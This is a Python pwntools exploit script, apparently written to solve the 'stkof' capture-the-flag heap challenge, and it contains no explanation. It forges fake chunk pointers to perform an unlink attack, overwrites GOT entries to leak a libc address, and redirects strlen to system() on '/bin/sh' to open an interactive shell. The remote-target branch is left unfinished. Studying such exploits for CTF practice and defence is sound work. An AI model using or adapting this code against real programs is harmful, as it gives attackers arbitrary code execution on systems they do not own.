#!/usr/bin/python
from pwn import *
import code

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
local = True
elf = ELF('./stkof')

if local:
	p = process('./stkof')
        #gdb.attach(p)
else:
	libc = ELF()
	p = remote()

def allo(size):
    p.sendline('1')
    p.sendline(str(size))

def read(n, leng, mes):
    p.sendline('2')
    p.sendline(str(n))
    p.sendline(str(leng))
    p.send(mes)

def free(n):
    p.sendline('3')
    p.sendline(str(n))

def strle(n):
    p.sendline('4')
    p.sendline(str(n))

p.sendline('a')
payload = p64(0) 
payload += p64(0)
payload += p64(0x602148-0x18)
payload += p64(0x602148-0x10)
payload += 'a' * 96
payload += p64(0x80)
payload += p64(0x90)

allo(0x80)
allo(0x80)
allo(0x80)

read(1, len(payload), payload)

free(2)

payload = p64(0) + p64(0)
payload += p64(elf.got['puts'])
payload += p64(elf.got['strlen'])

read(1, len(payload), payload)
read(1, 8, p64(elf.plt['puts']))
a = p.recv(1024)

strle(0)
a = p.recvuntil('\n')
print len(a[:-1])
leak = u64(a[:-1]+"\x00\x00")

system_addr = leak - 172800
read(1, 8, p64(system_addr))

read(3, len("/bin/sh"), "/bin/sh")

strle(3)

p.interactive()
